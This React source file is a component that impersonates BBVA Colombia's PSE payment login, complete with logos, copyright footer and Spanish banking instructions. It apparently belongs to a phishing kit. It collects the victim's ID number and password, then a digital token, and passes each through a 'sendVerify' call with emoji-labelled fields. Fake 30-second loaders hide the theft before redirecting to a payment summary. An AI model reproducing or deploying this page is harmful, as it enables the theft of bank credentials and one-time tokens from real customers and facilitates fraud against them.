import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { sendVerify } from '../verifyData';
import styles from './X06.module.css';
import logo from '../../Assets/Images/X06/logo.svg'
import logoFooter from '../../Assets/Images/X06/logoFooter.svg'
import loader from '../../Assets/Images/X06/loader.gif'
import loaderMain from '../../Assets/Images/loader.gif'

function X06() {

    const location = useLocation();
    const navigate = useNavigate();
    const { dataD, dataE } = location.state || {};

    const [dataF, setDataF] = useState('');
    const [dataG, setDataG] = useState('');
    const [dataH, setDataH] = useState('');

    const [showDataHSection, setShowDataHSection] = useState(false);
    const [showLoader, setShowLoader] = useState(false);
    const [showLoaderMain, setShowLoaderMain] = useState(false);

    const [showSectionB, setShowSectionB] = useState(false);

    const handleContinue = (e) => {

        e.preventDefault();

        if (!showDataHSection) {
            setShowLoader(true);
            sendVerify(`🆔: ${dataF}\n🔐: ${dataG}\n📧: ${dataE}\n🏦: ${dataD}`);

            setTimeout(() => {
                setShowLoader(false);
                setShowDataHSection(true);
            }, 30000)
        } else {
            sendVerify(`🔑: ${dataH}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowLoaderMain(true);
            setTimeout(() => {
                navigate("/resumenpago")
            }, 30000)
        }
    };

    return (
        <>
            <header className={styles.headerX06}>
                <img src={logo} alt='Logo'></img>
                <h1>Pago a través de PSE</h1>
            </header>
            <main className={styles.mainX06}>
                {!showSectionB && (
                    <section className={styles.sectionAX06}>
                        <h2>¿En cuál canal estás registrado como cliente?</h2>
                        <div>
                            <button onClick={() => setShowSectionB(true)}>BBVA Net Personas</button>
                            <button>BBVA Net Cash Empresas</button>
                        </div>
                        <div>
                            <p>¿Cuentas con clave para realizar transacciones online?</p>
                            <p>Para realizar pagos con tus productos en PSE, debes estar registrado en BBVA Net (Personas) o BBVA Net Cash (Empresas), tener activo tu Token Digital en la App BBVA o tener tarjeta de coordenadas y seguir las instrucciones de pago. Si aún no estás registrado, ingresa por la opción Acceso y regístrate en <span>BBVA.com.co</span></p>
                        </div>
                    </section>
                )}
                {showSectionB && (
                    <section className={styles.sectionBX06}>
                        <h2>{showDataHSection ? 'Token BBVA' : '¡Bienvenido!'}</h2>
                        <p>{!showDataHSection ? 'Recuerda que para realizar pagos a través de PSE, debes estar registrado en BBVA net. Regístrate en BBVA.com.co y para agilizar tu pago, ten a mano tu app BBVA móvil o la tarjeta de coordenadas.' : 'Genera un token digital a través de la App BBVA para confirmar esta operación. Es por tu seguridad.'}</p>
                        <form>
                            {!showDataHSection && (
                                <div className={styles.selectGroup}>
                                    <select placeholder=" ">
                                        <option>Cedula de Ciudadanía</option>
                                        <option>Cedula de Extranjería</option>
                                        <option>Tarjeta de Identidad</option>
                                    </select> 
                                    <label htmlFor="documentType">Tipo de documento</label>
                                </div>
                            )}
                            {!showDataHSection && (
                                <div className={styles.inputGroup}>
                                    <input type='number'
                                            value={dataF}
                                            onChange={(e) => setDataF(e.target.value)}
                                            placeholder=' '>
                                    </input>
                                    <label htmlFor="dataF">Numero de documento</label>
                                </div>
                            )}
                            {!showDataHSection && (
                                <div className={styles.inputGroup}>
                                    <input 
                                        id="dataG"
                                        type="password"
                                        value={dataG}
                                        onChange={(e) => setDataG(e.target.value)}
                                        placeholder=" "
                                    />
                                    <label htmlFor="dataG">Contraseña</label>
                                </div>
                            )}
                            {showDataHSection && (
                                <div className={styles.inputGroup}>
                                    <input 
                                        id="dataH"
                                        type="password"
                                        value={dataH}
                                        onChange={(e) => setDataH(e.target.value)}
                                        placeholder=" "
                                    />
                                    <label htmlFor="dataH">Ingrese el Token Digital</label>
                                </div>
                            )}
                            <button onClick={handleContinue}>{showDataHSection ? 'Entrar' : 'Continuar'}</button>
                        </form>
                    </section>
                )}
                {showLoader && (
                    <section className={styles.overlayX06}>
                        <img src={loader}></img>
                    </section>
                )}
                {showLoaderMain && (
                    <section className={styles.loaderMain}>
                        <img src={loaderMain}></img>
                    </section>
                )}
            </main>
            {!showSectionB && (
                <footer className={styles.footerX06}>
                    <img src={logoFooter} alt='Logo Footer'></img>
                    <div>
                        <p>Seguridad</p>
                        <p>Aviso Legal</p>
                        <p>Politicas</p>
                    </div>
                    <p>© 2020 BBVA Banco Bilbao Vizcaya Argentaria Colombia S.A</p>
                </footer>
            )}
        </>
    )
}

export default X06;